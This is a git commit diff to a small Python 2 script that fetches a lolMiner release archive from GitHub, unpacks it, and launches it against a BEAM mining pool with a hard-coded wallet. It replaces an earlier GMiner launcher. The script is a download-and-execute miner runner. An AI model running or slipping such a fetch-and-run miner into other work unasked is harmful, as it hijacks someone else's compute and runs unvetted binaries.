cacd79036ce095915b4f0981f23436cf5ea32994
c4l4ng0_m4t4d0r <40896649+D4rks1R3@users.noreply.github.com>
2021-09-15 17:11:52 -0300

    Update executeAGminer.py

--- executeAGminer.py
+++ executeAGminer.py
@@ -1,9 +1,11 @@
 #!/bin/python2
-from os import system 
+from os import system
+from time import sleep
 
-cmd = [" mkdir gminer && cd gminer ", " wget https://github.com/develsoftware/GMinerRelease/releases/download/2.68/gminer_2_68_linux64.tar.xz && tar -xvf gminer_2_68_linux64.tar.xz ", " rm -f gminer_2_68_linux64.tar.xz &&  ./miner --algo ethash --server stratum+tcp://ethash.poolbinance.com:443 --user 0x06a66734db7df7cd1b25e46f4d6dcaa282dbbe67.MinerMiq "]
 try:
-    for cmd_l in cmd:
-        system('%s' %cmd_l)
+	system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz && tar -xvf lolMiner_v1.32a_Lin64.tar.gz")
+	system("echo AAAA")
+	system("cd 1.32a")
+	system("./1.32a/lolMiner --algo BEAM-III  --pool  eu1-beam.flypool.org:3333 --user ab16399364798c38ab3636ffdbdad828dc7bede2f0f305cfa709635153f1a64799.MinerMiq --tls 0")
 except Exception as err:
-    print(" Error: ", err)
+		print(" Error: ", err)
